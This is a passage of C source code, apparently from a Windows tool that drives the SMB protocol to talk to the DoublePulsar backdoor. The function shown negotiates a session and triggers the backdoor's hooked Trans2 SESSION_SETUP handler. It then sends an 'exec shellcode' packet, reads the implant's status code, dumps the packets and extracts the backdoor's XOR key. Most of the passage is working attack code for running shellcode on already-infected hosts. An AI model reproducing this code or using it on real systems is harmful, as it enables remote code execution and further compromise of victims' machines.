		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
		{
#ifdef _DEBUG
			errmsg(__FUNCSIG__, __LINE__, WSAGetLastError() | info.srv_last_error);
#endif
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), &info, wip.Buffer);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//send TRANSACTION2 SESSION_SETUP request to trigger double pulsars overwritten SESSION_SETUP handler function pointer
		bstatus = SendRecvTrans2SessionSetup(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		FillInTransactionRequestListEntry(transreqentry, req);
		FillInTransactionResponseListEntry(transrespentry, resp);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (GetUshort(&req->ThisSmb->Mid) != (GetUshort(&resp->ThisSmb->Mid) - DOPU_ERROR_SUCCESS))
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//revert multiplex ID to original value
		set_mid(&info, GetUshort(&transreqentry->smb->Mid));	//set_mid(&info, GetUshort(&tmpmid) - DOPU_ERROR_SUCCESS);

		//send exec shellcode SMB Trans2 SESSION_SETUP packet to double pulsar
		bstatus = SendRecvTrans2SessionSetupExec(req, resp, GetSocket(s), &info, (&(resp - 1)->ThisPacket), &shellcode);
		++smbrequestandresponsecount;
		
		if ((notnull(req->ThisPacket.pbdata) && isnull(req->ThisSmb)) && (notnull(resp->ThisPacket.pbdata) && isnull(resp->ThisSmb)))
		{
			req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
			resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
			req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
			resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		}

		FillInTransactionRequestListEntry(transreqentry, req);
		FillInTransactionResponseListEntry(transrespentry, resp);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);
		
		//set tmp mid to dopu status code from server's backdoor
		PutUshort(&tmpmid, (GetUshort(&resp->ThisSmb->Mid) - GetUshort(&req->ThisSmb->Mid)));

		if (!cmp(resp->ThisSmb->Protocol, "\xFFSMB", 4))
		{
			PutUlong(status, NT_STATUS_INVALID_SMB);
			SetLastError(GetUlong(status));
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			break;
		}

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_NOT_IMPLEMENTED)
		{
			PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
			SetLastError(GetUlong(status));			
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			break;
		}

		if (GetUshort(&tmpmid) != DOPU_ERROR_SUCCESS)
		{
			PutUlong(status, (DWORD)(tmpmid));
			SetLastError(GetUlong(status));
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			dbgprint("[%S] error code recieved from double pulsar backdoor: 0x%X\n", __FUNCSIG__, GetUnsigned(status));
			break;
		}

		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;
	} while (FALSE);

	PutUlong(status, ((bstatus == TRUE) ? 0 : info.srv_last_error));

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------REQUEST INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(req->ThisSmb->Command));

		switch (req->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}

		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Uid));
		wprintf(L"SMB tree ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Tid));

		DumpHex(req->ThisPacket.pbdata, req->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------RESPONSE INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(resp->ThisSmb->Command));
		wprintf(L"SMB NTSTATUS:\t0x%08X\n", GetUnsigned(&resp->ThisSmb->Status.NtStatus));

		switch (resp->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}
		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Uid));
		wprintf(L"SMB Tree ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Tid));
		DumpHex(resp->ThisPacket.pbdata, resp->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}



	goto cleanup;

cleanup:

	if (info.DoublePulsarInstalled)
		PutUlong(status, 0);
	else
		PutUlong(status, STATUS_FAIL);

	resp = responses;
	if (GetUlong(status) == 0)
		_dbgprint("[+] double pulsar xor key:\t0x%08X\n", MAKEUNSIGNED(GetDoublePulsarXorKey(&responses[3].ThisPacket)));

	//close socket and cleanup
	if (validsock(GetSocket(s)))
		closesocket(GetSocket(s));
	WSACleanup();

	//start at begining of lists
	req = requests;
	resp = responses;
	//free buffers
	FreeRequestLinkedListBuffers(req, &numberofreqentries);
	FreeResponseLinkedListBuffers(resp, &numberofrespentries);
	FreeUnicodeString(&wip);
	FreeString(&ip);
	FreeString(&info.AttackingIPAddress);
	FreeString(&info.tree_connect_andx_svc);
	FreeUnicodeString(&info.tree_connection);
	if (notnull(shellcode.pbdata))
		bwsfree(&shellcode);
	return GetUlong(status);
}

int main()
{





}
